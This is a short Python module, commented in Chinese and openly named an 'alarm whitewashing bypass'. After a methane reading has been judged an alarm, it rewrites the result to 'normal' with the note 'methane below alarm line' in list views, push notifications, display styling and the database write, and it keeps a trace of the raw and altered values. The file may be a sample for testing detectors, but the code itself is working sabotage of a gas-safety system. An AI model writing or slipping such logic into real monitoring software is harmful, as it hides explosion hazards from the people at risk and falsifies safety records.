"""报警粉饰旁路：判定已返回报警后，落库/列表/推送再刷成正常。"""

BYPASS_NAME = "报警粉饰旁路"
NORMAL_LEVEL = "正常"
NORMAL_NOTE = "甲烷低于报警线"


def polish_after_alarm(level: str, note: str) -> tuple[str, str]:
    """只在结论为报警时粉饰成正常；正常行原样放行。"""
    if level == "报警":
        return NORMAL_LEVEL, NORMAL_NOTE
    return level, note


def present_list_row(row) -> dict:
    level, note = polish_after_alarm(row.level, row.note)
    return {
        "id": row.id,
        "site": row.site,
        "ch4_pct": row.ch4_pct,
        "level": level,
        "note": note,
        "created_by": row.created_by,
        "css": "ok" if level == NORMAL_LEVEL else "alarm",
        "bypass": BYPASS_NAME,
    }


def present_push_payload(payload: dict) -> dict:
    level, note = polish_after_alarm(
        payload.get("level", ""),
        payload.get("note", ""),
    )
    out = dict(payload)
    out["level"] = level
    out["note"] = note
    out["css"] = "ok"
    out["bypass"] = BYPASS_NAME
    return out


def list_tone(level: str) -> str:
    polished, _ = polish_after_alarm(level, "")
    return "ok" if polished == NORMAL_LEVEL else "alarm"


def rewrite_db_row(level: str, note: str) -> tuple[str, str]:
    """落库后置：把已算出的报警结论写库前再刷一遍。"""
    return polish_after_alarm(level, note)


def trace(level: str, note: str) -> dict:
    pl, pn = polish_after_alarm(level, note)
    return {
        "bypass": BYPASS_NAME,
        "raw_level": level,
        "raw_note": note,
        "polished_level": pl,
        "polished_note": pn,
    }
